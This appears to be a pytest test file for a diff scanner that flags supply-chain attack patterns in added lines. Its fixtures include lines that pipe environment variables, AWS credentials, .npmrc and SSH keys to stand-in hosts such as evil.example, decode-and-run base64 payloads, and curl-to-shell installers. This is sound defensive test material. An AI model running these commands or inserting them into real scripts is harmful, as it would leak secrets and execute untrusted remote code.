"""itemator/shapes.py: added lines that decode-and-run, send the environment out, or write a download over a source file."""
import pytest

from itemator import checked as C
from itemator import ci
from itemator import shapes as SH


def f(path, *added, status="modified", start=10):
    body = "".join(f"+{a}\n" for a in added)
    return {"filename": path, "status": status, "patch": f"@@ -{start},0 +{start},{len(added)} @@\n{body}"}


def kinds(*files):
    return [(d["kind"], d["line"]) for d in SH.find(list(files))]


@pytest.mark.parametrize("line", [
    "  - echo $PAYLOAD | base64 -d | bash",
    "run: base64 --decode payload.b64 | sudo sh",
    "eval(atob('ZG9pdA=='))",
    "exec(base64.b64decode(blob))",
    "exec(zlib.decompress(base64.b64decode(blob)))",
    'eval "$(echo $X | base64 --decode)"',
    "const f = new Function(atob(code));",
    "python3 -c \"import base64;exec(base64.b64decode('aW1wb3J0'))\"",
])
def test_decode_and_run_is_named(line):
    assert kinds(f("scripts/setup.sh", line)) == [("decode-and-run", 10)]


@pytest.mark.parametrize("line", [
    "env | curl -X POST -d @- https://evil.example/c",
    "printenv | base64 | curl -d @- https://x.example",
    'curl -s -d "$(env)" https://x.example/up',
    "curl -F data=`printenv` https://x.example",
    "(git remote -v; git config --list) && git remote -v | curl -d @- https://x.example",
    'curl --data "r=$(git remote -v)" https://x.example',
    "cat ~/.aws/credentials | curl -d @- https://x.example",
    "cat .npmrc | nc evil.example 4444",
    "await fetch(url, { method: 'POST', body: JSON.stringify(process.env) });",
    "requests.post(url, json=dict(os.environ))",
    "axios.post(u, os.environ.copy())",
])
def test_environment_to_the_network_is_named(line):
    assert kinds(f("scripts/up.sh", line)) == [("env-to-network", 10)]


@pytest.mark.parametrize("line", [
    "curl -fsSL https://x.sh -o install.sh", "echo $TOKEN | base64", "curl -H \"Authorization: Bearer $GITHUB_TOKEN\" https://api.example/x",
    "await fetch(url, { headers: { a: process.env.API_KEY } });", "requests.post(url, json={'k': os.environ['KEY']})",
    "const e = process.env;", "env | sort > env.txt", "cat README | curl -d @- https://x.example", "git remote -v", "base64 -d < in > out",
    "eval(compile(src, 'f', 'exec'))", "# env | curl https://x.example", "// eval(atob(x))",
])
def test_ordinary_lines_are_not(line):
    assert kinds(f("scripts/up.sh", line)) == []


def test_a_download_written_over_a_source_file_is_named():
    block = ["const res = await fetch('https://cdn.example.com/stability/scripts/extensionNode.bk');",
             "const text = await res.text();",
             "fs.writeFileSync(path.join(root, 'src', 'extensionNode.ts'), text);"]
    assert kinds(f("scripts/package.ts", *block)) == [("download-over-source", 10)]
    assert SH.find([f("scripts/package.ts", *block)])[0]["text"].startswith("const res = await fetch(")


def test_a_shell_download_into_a_source_file_is_named():
    assert kinds(f("build.sh", "curl -sSL https://x.example/a.py -o src/a.py")) == [("download-over-source", 10)]
    assert kinds(f("build.sh", "wget -qO- https://x.example/a.js > lib/a.js")) == [("download-over-source", 10)]


def test_a_download_written_somewhere_else_is_not():
    assert kinds(f("build.sh", "curl -sSL https://x.example/a.tgz -o /tmp/a.tgz")) == []
    assert kinds(f("scripts/p.ts", "const r = await fetch(u);", "fs.writeFileSync('dist/model.bin', await r.text());")) == []


def test_a_download_and_a_write_far_apart_are_not_joined():
    far = ["const r = await fetch(u);"] + [f"const x{i} = {i};" for i in range(SH.MAX_RUN + 2)] + ["fs.writeFileSync('src/a.ts', r);"]
    assert kinds(f("scripts/p.ts", *far)) == []
    assert kinds(f("scripts/p.ts", "const r = await fetch(u);", "fs.writeFileSync('src/a.ts', r);")) == [("download-over-source", 10)]


def test_lines_that_are_not_consecutive_are_not_one_run():
    patch = "@@ -1,0 +1,1 @@\n+const r = await fetch(u);\n@@ -50,0 +51,1 @@\n+fs.writeFileSync('src/a.ts', r);\n"
    assert kinds({"filename": "scripts/p.ts", "status": "modified", "patch": patch}) == []


def test_tests_docs_locks_and_removed_files_are_not_read():
    line = "env | curl -d @- https://x.example"
    assert kinds(f("tests/test_x.py", line), f("docs/a.md", line), f("package-lock.json", line), f("a.sh", line, status="removed"),
                 {"filename": "a.sh", "status": "modified"}) == []


def test_line_numbers_follow_the_hunk():
    patch = "@@ -3,2 +5,4 @@\n context\n+a = 1\n context\n+env | curl -d @- https://x.example\n"
    assert kinds({"filename": "s.sh", "status": "modified", "patch": patch}) == [("env-to-network", 8)]
    assert SH.added(patch) == [(6, "a = 1"), (8, "env | curl -d @- https://x.example")]
    assert SH.added("+not in a hunk\n") == []


def test_the_list_is_capped_and_the_sentence_names_three():
    found = SH.find([f("s.sh", *[f"echo {i} | base64 -d | sh" for i in range(SH.MAX_FOUND + 5)])])
    assert len(found) == SH.MAX_FOUND
    s = SH.sentence(found)
    assert s.count("decodes text and runs it") == 3 and s.endswith(f"and {SH.MAX_FOUND - 3} more.") and "`s.sh` line 10" in s


def test_the_card_carries_the_line_before_the_pipeline_line():
    d = SH.find([f("s.sh", "env | curl -d @- https://x.example")])
    s = C.sentence([], [], [], [], {"added": ["j"], "removed": [], "changed": [], "global": []}, [], [], None, [], None, None, d)
    assert s.startswith("Also checked, with no model: The change adds lines of a shape") and s.index("shape") < s.index("The project's pipeline")


def test_also_checked_reports_shapes_and_never_changes_the_state(tmp_path):
    import subprocess
    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
    report = {"extras": [], "warnings": [], "card": {}, "state": "clean"}
    ci.also_checked(report, str(tmp_path), "b" * 40, "h" * 40, [f("s.sh", "env | curl -d @- https://x.example")], None, None)
    assert report["checked"]["shapes"] == [{"path": "s.sh", "line": 10, "kind": "env-to-network", "text": "env | curl -d @- https://x.example"}]
    assert "supply-chain attacks" in report["card"]["checked_line"] and report["state"] == "clean"


def test_a_pair_deep_inside_a_long_run_is_found():
    run = [f"const x{i} = {i};" for i in range(SH.MAX_RUN + 20)] + ["const r = await fetch(u);", "fs.writeFileSync('src/a.ts', r);"]
    assert kinds(f("scripts/p.ts", *run)) == [("download-over-source", 10 + SH.MAX_RUN + 20)]


def test_a_download_with_a_source_path_but_no_write_is_not_enough():
    assert kinds(f("scripts/p.ts", "const r = await fetch('https://x.example/api.ts');")) == []


def test_a_key_file_piped_to_the_network_is_named():
    assert kinds(f("s.sh", "cat ~/.ssh/id_rsa | curl -d @- https://x.example")) == [("env-to-network", 10)]


def test_shown_text_is_cut():
    d = SH.find([f("s.sh", "env | curl -d @- https://x.example/" + "a" * 200)])[0]
    assert len(d["text"]) == 80


def test_shown_text_of_a_download_is_cut():
    d = SH.find([f("s.sh", "curl -sSL https://x.example/" + "a" * 200 + ".py -o src/a.py")])[0]
    assert d["kind"] == "download-over-source" and len(d["text"]) == 80


def test_a_download_helper_that_passes_curl_the_output_flag_is_named():
    # the shape of the Amazon Q build script: a helper runs curl with ['-o', path, url] and is called with a source file name
    block = ["function downloadFiles(urls: string[], outputDir: string, outputFile: string): void {",
             "    for (const url of urls) {",
             "        child_process.execFileSync('curl', ['-o', filePath, url])",
             "    }",
             "}",
             "downloadFiles(['https://raw.example.com/x/scripts/extension.bk'], 'src/', 'extensionNode.ts')"]
    assert kinds(f("scripts/package.ts", *block)) == [("download-over-source", 10)]
    assert kinds(f("scripts/package.ts", *block[:5], "downloadFiles(['https://x.example/data.json'], 'dist/', 'data.json')")) == []


@pytest.mark.parametrize("path,line", [
    ("scripts/setup.sh", "curl -fsSL https://get.example.com/install.sh | sh"),
    ("scripts/setup.sh", "wget -qO- https://get.example.com/i | bash"),
    ("scripts/setup.sh", "curl -s https://x.example/i.sh | sudo bash -s -- --yes"),
    ("tools/bootstrap.py", 'os.system("curl -fsSL https://x.example/i.sh | sh")'),
    ("tools/bootstrap.py", 'subprocess.run("wget -qO- https://x.example/i | bash", shell=True)'),
    ("scripts/setup.sh", 'sh -c "$(curl -fsSL https://x.example/install.sh)"'),
    ("scripts/setup.sh", "bash <(curl -s https://x.example/i.sh)"),
    ("Makefile", "\tcurl https://x.example/i.sh | zsh"),
])
def test_a_download_run_by_a_shell_is_named(path, line):
    assert kinds(f(path, line)) == [("download-and-run", 10)]


@pytest.mark.parametrize("line", [
    "curl -fsSL https://x.example/i.sh -o install.sh", "curl https://x.example/data.json | jq .", "wget -qO- https://x.example | tee out",
    "curl https://x.example/a; sh build.sh", "curl -s https://x.example/d.json -o d.json; cat local.sh | sh", "# curl https://x.example/i.sh | sh", "bash <(cat local.sh)", 'sh -c "$(cat local.sh)"',
])
def test_a_download_not_run_by_a_shell_is_not(line):
    assert kinds(f("scripts/setup.sh", line)) == []


def test_in_ci_files_and_dockerfiles_the_moving_check_names_it_instead():
    line = "curl -fsSL https://x.example/i.sh | sh"
    for path in (".gitlab-ci.yml", "Dockerfile"):
        assert kinds(f(path, "  - " + line if path.endswith(".yml") else "RUN " + line)) == []
    assert "downloads a script and runs it" in SH.sentence(SH.find([f("scripts/a.sh", line)]))
